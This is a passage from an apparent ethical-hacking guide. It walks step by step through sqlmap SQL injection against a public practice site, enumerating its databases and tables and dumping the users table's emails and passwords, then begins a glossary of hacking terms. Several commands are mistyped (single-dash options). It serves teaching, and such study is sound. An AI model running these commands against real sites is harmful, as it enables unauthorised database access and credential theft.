    ## Step Two


    - At the command prompt, type in `sqlmap -u`, followed by the name of the website
    you want to test. For the purposes of this exercise, type in `sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1`.


    You can use a command called `-time-sec` to help speed things up, very useful
    when the server is on a go-slow.


    ```

    sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -time-sec 15

    ```


    Whichever way you choose, when it’s finished, you will see the MySQL database
    version and some more useful information.


    You may find that `sqlmap` asks you some questions and these will require simple
    yes/no answers. Type `y` for yes and `n` for no. These are some of the messages
    you may come across:


    - A message that tells you the database is likely to be MySQL and asking if `sqlmap`
    should forget about the other tests and only conduct the MySQL tests. Your answer
    will be `y` for yes.

    - A message that asks whether the payloads for certain MySQL versions should be
    used. The answer is wholly dependent on the situation but if you are not sure,
    answer `y` for yes.


    ## Enumeration - Database


    Next, we are going to get some information from the database - the name, the names
    of the columns, and some other stuff.


    ### Step Three


    First, we need to get the names of all the databases available so, at the command
    prompt, type in:


    ```

    sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -dbs

    ```


    You should see two databases, one called `information schema` and the other called
    `acuart`.


    ### Table


    The one we want is the `acuart` database - the other one is more of a default
    database that will be on every target. It contains details of database and table
    structures but it doesn’t have any other useful information for us, at least not
    for our purposes.


    ### Step Four


    Now we need to tell `sqlmap` which database we want and ask it to enlist the database
    tables. At your command prompt type in:


    ```

    sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -tables

    ```


    You should see a list of tables:


    Database: acuart

    8 tables

    - artists

    - carts

    - categ

    - featured

    - guestbook

    - pictures

    - products

    - users


    ### Columns


    We can do the same thing to get a list of the column names using a couple of extra
    commands. The table we are the most interested in is the one called `users` because
    it is likely to contain the sensitive information that hackers want, such as usernames
    and passwords. At your command prompt, type in:


    ```

    sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users
    -columns

    ```


    Now we will specify the database using `-D`, the table using `-T`, and then request
    the columns using `--columns`. I hope you guys are starting to get the pattern
    by now. The most appealing table here is `users`. It might contain the username
    and passwords of registered users on the website (hackers always look for sensitive
    data).


    The final command must be something like—


    ```

    sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users
    -columns

    ```


    and you should see something like this on your screen:


    Database: acuart

    Table: users

    8 columns


    | Column | Type |

    | :--- | :--- |

    | address | mediumtext |

    | cart | varchar(100) |

    | cc | varchar(100) |

    | email | varchar(100) |

    | name | varchar(100) |

    | pass | varchar(100) |

    | phone | varchar(100) |

    | uname | varchar(100) |


    ### Data


    Next, we can get the data we want from those columns and this time, we want several
    columns, not just one. The names of the columns must be separated with a comma
    in the command; type this in at the command prompt:


    ```

    sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users
    -C email, name, pass --dump

    ```


    And the result should read John Smith, with a password of test and an email address
    of email@email.com?? Nothing fantastic but, if you were doing this for real, you
    would be to get a lot more information.


    What you should do with that information is to email the administration of the
    website and tell them that their sensitive data is vulnerable and how. Don’t fall
    into the trap of stepping over to the dark side; prisons are not nice places!


    If you’re finding the information valuable so far, please be sure to leave [5-star
    feedback on Amazon](https://www.amazon.com/dp/B07NSRW9FZ)


    # Glossary of Hacking Terms


    One of the biggest challenges faced by those who write about hacking and who read
    about it, is getting to know the jargon and the terms associated with it - and
    there is a lot of it! Accuracy is very important as is using the correct terms
    in the correct places so, to help you out, I’ve produced a list of the terms you
    are likely to come across and/or need to know as an ethical hacker.


    ## A


    ### Attribution


    This is the process of determining the person or persons behind an attack. This
    tends to be a very difficult part of the response to breaches because an experienced
    hacker can bury themselves under several layers of services online to hide who
    they are and where they are. On many occasions, major breaches, like the Sony
    hack, are never attributed to a specific person.


    ## B


    ### Backdoor


    When you go into a system that is protected using the correct username and password,
    you are entering through the front door. Some companies will have a back door
    built in so that their developers can get in without needing to go through authentication.
    These are secret but, if discovered by a hacker, may be exploited. Hackers can
    also build their own backdoors into a system if they can get in undetected.


    Black hat

    Otherwise known as an unethical hacker, a black hat is someone who hacks into
    a system for their own personal gain and to carry out illegal activities.


    ### Botnet


    A botnet, otherwise called a zombie army, is a network where all the computers
    are controlled by the hacker. It could be a couple of systems, it could be hundreds
    or thousands of computers but for a hacker, commanding a botnet give them the
    ability to carry out certain attacks, such as DDoS. Instead of purchasing all
    those computers, a hacker will make use of malware to infect computers on a network.
    Your system may be part of a botnet and you may never know.


    ### Brute force


    Brute force is one of the most unsophisticated methods of cracking a password.
    It is a system of trial and error, using wordlists to try to get the right password.
    These days, the encryption systems we use tend to be better at slowing these attacks
    down, making it much harder, if not impossible for the hacker to try every possible
    combination in the shortest amount of time.


    ### Bug


    Everyone has heard of a bug; it is a flaw of some description in a program. Some
    do no harm while others can easily be exploited. Companies like Apple and Google
    have now started Bug Bounty programs where they pay people who find these bugs
    and report them before a hacker can get to them - this is one way of making a
    bit of extra cash as an ethical hacker.


    ## C


    ### Cracking


    A generalized way of describing unauthorized entry to a security system. However,
    while the words “cracking” and “cracker” have become synonymous with “hacking”
    and “hacker” but this is misleading. A hacker is a person who tends to tinker
    and isn’t always unethical whereas a cracker is usually malicious in intent (not
    always though).


    ### Crypto


    A sort version of cryptography, this refers to the way that messages and data
    are hidden from plain view.


    ### Chip-off


    Chip-off attacks are where the hacker needs to remove memory chips physically
    from a computer so they can be scraped for information using special programs.
    Law enforcement has used this kind of attack to access information from Blackberry
    phones with PGP protection.


    ## D


    ### Dark web


    The dark web is just that, dark. It is constructed from websites that will not
    be indexed by the search giants like Google and can only be accessed using networks
    like Tor. It tends to be used by people who want to stay anonymous and whatever
    is on the dark web is on the deep web but not necessarily vice versa.


    ### DDoS

